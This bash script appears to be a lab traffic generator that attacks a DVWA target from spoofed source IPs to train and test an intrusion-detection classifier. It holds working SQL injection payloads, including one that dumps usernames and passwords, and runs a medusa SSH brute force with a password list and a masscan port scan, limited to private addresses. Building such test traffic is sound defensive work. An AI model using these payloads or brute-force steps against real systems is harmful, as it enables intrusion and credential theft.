#!/usr/bin/env bash
#
# attack_multitool.sh - same attack CLASSES as attack_dvwa.sh, but driven with
# DIFFERENT tools / parameters from THREE NEW source IPs, so the classifier sees
# more than one signature per attack type and CyREN sees more attacker sources.
#
# This COMPLEMENTS lab/attack_dvwa.sh (it does not replace it). Together the two
# scripts give six attacker IPs, each with a distinct technique:
#
#   attack_dvwa.sh  : .104 sqlmap SQLi         .150 curl XSS+CmdInj   .151 hydra+nmap
#   attack_multitool: .105 manual curl SQLi    .152 medusa SSH brute  .161 masscan scan
#
# Why this matters: a single-tool dataset teaches the model one signature per
# class (e.g. "SQLi == sqlmap's request pattern"). Adding hand-crafted curl
# injection, a different brute-forcer and a different scanner gives the same
# attack CLASS a second, genuinely different signature - all real tool traffic,
# nothing fabricated.
#
# It reuses the EXISTING path-based detection rules (see lab/README_lab.md), so
# NO rule or pipeline change is needed:
#   - manual SQLi hits /dvwa/vulnerabilities/sqli   -> "SQL Injection Detected"
#   - medusa produces sshd "Failed password"        -> "SSH Brute Force Detected"
#   - masscan trips the target's iptables PORTSCAN   -> "Port Scan Detected"
#
# SAFETY: private (RFC1918) lab targets only; refuses any public target. Use
# exclusively on infrastructure you own and are authorised to test.
#
# Usage:
#   sudo IFACE=eth0 TARGET=192.168.56.101 ./attack_multitool.sh
#   sudo ./attack_multitool.sh --only sqli      # one attack (sqli|ssh|scan)
#   sudo ./attack_multitool.sh --yes            # skip the confirmation prompt
#
set -uo pipefail

# ----------------------------------------------------------------- config
TARGET="${TARGET:-192.168.56.101}"         # DVWA victim
IFACE="${IFACE:-eth0}"                      # Kali interface on the 56.0/24 net
DVWA_USER="${DVWA_USER:-admin}"
DVWA_PASS="${DVWA_PASS:-password}"

# three NEW attacker source IPs (aliased onto $IFACE), one technique each
IP_SQLI="${IP_SQLI:-192.168.56.105}"        # manual curl SQL injection
IP_SSH="${IP_SSH:-192.168.56.152}"          # medusa SSH brute force
IP_SCAN="${IP_SCAN:-192.168.56.161}"        # masscan port scan
ALIASES=("$IP_SQLI" "$IP_SSH" "$IP_SCAN")

# tool parameters (the "different parameters" knobs)
MEDUSA_THREADS="${MEDUSA_THREADS:-4}"       # medusa parallel logins
MEDUSA_USER="${MEDUSA_USER:-sysadmin}"      # account to brute (no valid login expected)
MASSCAN_RATE="${MASSCAN_RATE:-1000}"        # packets/sec (high-rate, unlike nmap)
MASSCAN_PORTS="${MASSCAN_PORTS:-1-1000}"
MASSCAN_ROUTER_MAC="${MASSCAN_ROUTER_MAC:-}" # set if masscan cannot find the gateway

COOKIE_JAR="$(mktemp)"
PASSLIST=""
ONLY=""
ASSUME_YES=0

# ------------------------------------------------------------- pretty print
c_ok()   { printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
c_info() { printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
c_warn() { printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
c_err()  { printf '\033[1;31m[x]\033[0m %s\n' "$*" >&2; }
phase()  { printf '\n\033[1;36m===== %s =====\033[0m\n' "$*"; }

# --------------------------------------------------------------- arg parse
while [ $# -gt 0 ]; do
  case "$1" in
    --only) ONLY="$2"; shift 2 ;;
    --yes)  ASSUME_YES=1; shift ;;
    -h|--help) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0 ;;
    *) c_err "unknown argument: $1"; exit 2 ;;
  esac
done

# ------------------------------------------------------------ safety checks
case "$TARGET" in
  10.*|192.168.*|172.1[6-9].*|172.2[0-9].*|172.3[0-1].*) : ;;
  *) c_err "TARGET $TARGET is not a private lab address. Refusing to run."; exit 1 ;;
esac

if [ "$(id -u)" -ne 0 ]; then
  c_err "run as root (needed for IP aliasing and source routing): sudo $0"
  exit 1
fi

# curl is mandatory (used for auth + manual SQLi); the rest are checked per
# phase so a single missing tool does not block the others.
command -v curl >/dev/null 2>&1 || { c_err "missing tool: curl (apt install curl)"; exit 1; }
have() { command -v "$1" >/dev/null 2>&1; }

echo
c_warn "CyREN lab multi-tool attack simulation (complements attack_dvwa.sh)"
c_warn "  attacker : $(hostname) via $IFACE, aliased to ${ALIASES[*]}"
c_warn "  target   : $TARGET (DVWA)"
c_warn "  attacks  : SQLi(manual curl) SSH(medusa) Scan(masscan)"
if [ "$ASSUME_YES" != 1 ]; then
  read -r -p "This generates real attack traffic against $TARGET. Continue? [y/N] " ans
  [ "$ans" = "y" ] || [ "$ans" = "Y" ] || { c_info "aborted."; exit 0; }
fi

# --------------------------------------------------- source-IP aliasing
# For OS-socket-stack tools (curl, medusa) one `ip route ... src` change sets
# the source address. masscan crafts its own packets and IGNORES that route, so
# it is given its source with masscan's own --adapter-ip flag instead.
setup_aliases() {
  for ip in "${ALIASES[@]}"; do
    ip addr add "$ip/24" dev "$IFACE" 2>/dev/null && c_info "added alias $ip" || true
  done
}

use_source() {   # route traffic to the target out of a chosen alias (socket tools)
  local src="$1"
  ip route replace "$TARGET" dev "$IFACE" src "$src"
  c_info "source IP for this phase: $src"
}

target_mac() {   # resolve the target's L2 address (it is on the same subnet)
  ping -c1 -W1 "$TARGET" >/dev/null 2>&1 || true          # populate the ARP cache
  ip neigh show "$TARGET" 2>/dev/null \
    | grep -oiE '([0-9a-f]{2}:){5}[0-9a-f]{2}' | head -1
}

cleanup() {
  c_info "cleaning up aliases and route"
  ip route replace "$TARGET" dev "$IFACE" 2>/dev/null || true
  for ip in "${ALIASES[@]}"; do ip addr del "$ip/24" dev "$IFACE" 2>/dev/null || true; done
  rm -f "$COOKIE_JAR" "$PASSLIST" 2>/dev/null || true
}
trap cleanup EXIT

# ------------------------------------------------------- DVWA authentication
# The vulnerable modules need a logged-in session at security level "low".
# (Duplicated from attack_dvwa.sh on purpose so the two scripts stay independent.)
dvwa_token() { # $1 = page path
  curl -s -b "$COOKIE_JAR" "http://$TARGET/$1" \
    | grep -oP "user_token'[^>]*value='\K[0-9a-f]+" | head -1
}

dvwa_login() {
  local t
  t="$(curl -s -c "$COOKIE_JAR" "http://$TARGET/dvwa/login.php" \
       | grep -oP "user_token'[^>]*value='\K[0-9a-f]+" | head -1)"
  curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" -o /dev/null \
       --data "username=$DVWA_USER&password=$DVWA_PASS&Login=Login&user_token=$t" \
       "http://$TARGET/dvwa/login.php"
  t="$(dvwa_token dvwa/security.php)"
  curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" -o /dev/null \
       --data "security=low&seclevel=low&user_token=$t" \
       "http://$TARGET/dvwa/security.php"
  local sid
  sid="$(grep -i PHPSESSID "$COOKIE_JAR" | awk '{print $NF}' | tail -1)"
  if [ -z "$sid" ]; then
    c_err "DVWA login failed (no session cookie). Is DVWA reachable at http://$TARGET/dvwa/ ?"
    return 1
  fi
  DVWA_SID="$sid"
  c_ok "authenticated to DVWA (PHPSESSID=${sid:0:8}..., security=low)"
}

# ---------------------------------------------------------------- attacks
attack_sqli() {
  phase "SQL Injection - hand-crafted curl (UNION / boolean / error / time-based)"
  use_source "$IP_SQLI"
  dvwa_login || return 1
  # Real DVWA-low injection strings. Different signature from sqlmap: fewer,
  # deliberate requests, no sqlmap User-Agent, human-readable payloads. Every
  # request carries the /vulnerabilities/sqli/ path the rule matches, and the
  # payloads carry union/select/sleep/' and so has_attack_keyword fires too.
  local payloads=(
    "1' UNION SELECT user,password FROM users-- -"
    "1' OR '1'='1"
    "1' AND 1=1-- -"
    "1' AND 1=2-- -"
    "1' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -"
    "1' AND SLEEP(3)-- -"
  )
  for p in "${payloads[@]}"; do
    curl -s -b "$COOKIE_JAR" -o /dev/null -G \
      --data-urlencode "id=$p" --data "Submit=Submit" \
      "http://$TARGET/dvwa/vulnerabilities/sqli/"
    c_info "sent: $p"
  done
  c_ok "manual SQLi traffic sent from $IP_SQLI"
}

attack_ssh() {
  phase "SSH Brute Force - medusa (different tool / rate from hydra)"
  if ! have medusa; then c_warn "medusa not installed (apt install medusa); skipping"; return 0; fi
  use_source "$IP_SSH"
  PASSLIST="$(mktemp)"
  printf '%s\n' 123456 password admin root toor letmein qwerty \
    dvwa password123 P@ssw0rd changeme > "$PASSLIST"
  # >5 failed logins in a short burst trips the threshold rule; sshd logs
  # "Failed password ... from <source-ip>" which the rule keys on.
  medusa -h "$TARGET" -u "$MEDUSA_USER" -P "$PASSLIST" -M ssh \
    -t "$MEDUSA_THREADS" -f -O /dev/null \
    || c_warn "medusa finished (expected: no valid login)"
  c_ok "SSH brute force traffic sent from $IP_SSH"
}

attack_scan() {
  phase "Port Scan - masscan (high-rate, raw sockets)"
  if ! have masscan; then c_warn "masscan not installed (apt install masscan); skipping"; return 0; fi
  # masscan crafts its own packets and IGNORES the OS `ip route ... src`, so
  # unlike nmap -sT it honours neither use_source nor the alias unless told:
  #   --adapter-ip : the source address to stamp on the SYNs (our .161 alias)
  #   --router-mac : where to send them. On a VirtualBox host-only subnet there
  #                  is no gateway to ARP, so masscan silently falls back to the
  #                  OS default source (wrong IP) and the target logs the scan
  #                  under that address, not .161 -> no .161 Port Scan event.
  #                  The target is L2-adjacent, so point masscan straight at the
  #                  target's own MAC; the SYNs then go out with SRC=.161 and the
  #                  iptables PORTSCAN rule attributes the scan to .161.
  local rmac="$MASSCAN_ROUTER_MAC"
  [ -z "$rmac" ] && rmac="$(target_mac)"
  local mac_arg=()
  if [ -n "$rmac" ]; then
    mac_arg=(--router-mac "$rmac")
    c_info "masscan --adapter-ip $IP_SCAN --router-mac $rmac (direct to target)"
  else
    c_warn "could not resolve target MAC; masscan may attribute the scan to the wrong source. Set MASSCAN_ROUTER_MAC=<target-mac> and re-run."
  fi
  masscan "$TARGET" -p"$MASSCAN_PORTS" --rate "$MASSCAN_RATE" \
    -e "$IFACE" --adapter-ip "$IP_SCAN" "${mac_arg[@]}" \
    || c_warn "masscan returned non-zero"
  c_ok "port scan traffic sent from $IP_SCAN"
  c_info "verify on the target: sudo grep PORTSCAN /var/log/kern.log | grep SRC=$IP_SCAN | tail"
}

# ------------------------------------------------------------------- run
setup_aliases

for fn in attack_sqli attack_ssh attack_scan; do
  if [ -z "$ONLY" ] || [ "$ONLY" = "${fn#attack_}" ]; then
    "$fn"
  fi
done

phase "Done"
c_ok "All requested multi-tool attacks sent. Check Kibana (Security > Alerts) and CyREN."
c_info "Source IPs .105/.152/.161 join .104/.150/.151 for six attacker sources total."
